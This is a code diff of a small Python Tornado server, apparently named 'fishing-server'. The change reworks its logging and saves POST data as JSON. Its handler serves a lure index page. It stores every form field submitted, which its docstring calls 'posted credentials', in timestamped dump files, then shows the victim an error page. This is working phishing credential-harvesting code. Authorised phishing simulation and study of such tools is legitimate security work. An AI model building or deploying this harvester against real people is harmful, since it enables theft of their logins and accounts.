@@ -1,26 +1,28 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-import datetime
-import logging
 import os
+import json
+import logging
+import datetime
 from tornado import web
 from tools import ConfLoader, server, FileManager
 
-(log_level, log_file) = ConfLoader.load_log_conf()  # load log conf
-logging.basicConfig(format='%(asctime)s %(levelname)s:%(message)s', level=log_level, filename=log_file)  # init logger
+logger = logging.basicConfig(filename='../logs/fishing-server.log',
+                             format='%(asctime)s %(levelname)s:%(message)s',
+                             level=logging.DEBUG)
 
 
 class MainHandler(web.RequestHandler):
     """MainHandler handle root and unknown endpoints"""
 
     def get(self):
-        # TODO doc
+        """Give index page"""
         with open(index_file, mode='r', encoding='UTF-8') as file:
             self.write(file.read())
 
     def post(self):
-        # TODO doc
+        """Save posted credentials and give an error page"""
         arguments = {}
         try:
             for k in self.request.arguments:
@@ -29,8 +31,7 @@ class MainHandler(web.RequestHandler):
             logging.warning('Argument error on MainHandler POST request')
         if len(arguments) > 0:
             dump = os.path.join(dump_path, str(datetime.datetime.now()))
-            content = str(arguments) + '\n'
-            FileManager.append_to_file(dump, content)
+            FileManager.append_to_file(dump, content=json.dumps(arguments))
         else:
             logging.info('POST request without arguments')
         with open(error_file, mode='r', encoding='UTF-8') as page:
